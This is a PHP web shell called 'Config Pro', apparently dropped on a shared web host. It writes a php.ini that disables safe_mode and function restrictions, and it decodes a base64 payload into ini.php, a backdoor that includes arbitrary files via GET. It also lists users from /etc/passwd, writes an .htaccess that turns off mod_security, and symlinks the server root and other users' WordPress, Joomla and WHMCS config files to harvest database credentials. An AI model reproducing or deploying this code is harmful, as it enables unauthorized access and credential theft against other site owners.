<title>Configs</title>
<p align="center">/home/Frank_Wix/public_html/</p>
<?php
echo'<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
<td width="100%" align=center valign="top" rowspan="1">
<center><font color="green" size="6" face="impact">Config Pro</center></font>
<div class="hedr">
<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
</table>';
?>
<center>
<form method=post><font color=white size=2 face="comic sans ms">Get Usernames for symlink</font><p>
<input type=submit name="usre" value="Extract usernames" /></form> 
<?php
$r=fopen('php.ini','w');
$rr="safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE";
fwrite($r,$rr);
?>
<?php
$shellololol = 'PD8NCmVjaG8gaW5pX2dldCjigJxzYWZlX21vZGXigJ0pOw0KZWNobyBpbmlfZ2V0KOKAnG9wZW5fYmFzZWRpcuKAnSk7DQppbmNsdWRlKCRfR0VUWyJmaWxlIl0pOw0KaW5pX3Jlc3RvcmUo4oCcc2FmZV9tb2Rl4oCdKTsNCmluaV9yZXN0b3JlKOKAnG9wZW5fYmFzZWRpcuKAnSk7DQplY2hvIGluaV9nZXQo4oCcc2FmZV9tb2Rl4oCdKTsNCmVjaG8gaW5pX2dldCjigJxvcGVuX2Jhc2VkaXLigJ0pOw0KaW5jbHVkZSgkX0dFVFsic3MiXSk7DQo/Pg==';
$zerer = fopen("ini.php" ,"w+");
$write = fwrite ($zerer ,base64_decode($shellololol));
fclose($zerer);
?>
<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}
?></textarea><br><br>
<input type=submit name=su value="Extract Them Now" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{
mkdir('sym',0777);
$rr  = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$g = fopen('sym/.htaccess','w');
fwrite($g,$rr);
$Sym = symlink("/","sym/root");
$rt="<a href=sym/root><font color=green size=5 face=\"impact\"> r00t</font></a>";
echo "<br><u>$rt</u>";
$dir=mkdir('sym',0777);
$r  = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('sym/.htaccess','w'); 
fwrite($f,$r);
$symsym="<a href=sym/><font color=green size=5 face=\"impact\">configuration files</font></a>";
echo "<br><br><u><font color=red size=2 face=\"comic sans ms\">$symsym</font></u>";
$usr=explode("\n",$_POST['user']);
$configuration=array("wp-config.php","wordpress/wp-config.php","wp/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","web/sites/default/settings.php","sites/default/settings.php");
foreach($usr as $uss )
{
$us=trim($uss);
foreach($configuration as $c)
{
$rs="/home/".$us."/public_html/".$c;
$r="sym/".$us." .. ".$c;
symlink($rs,$r);
}
}
}
?>
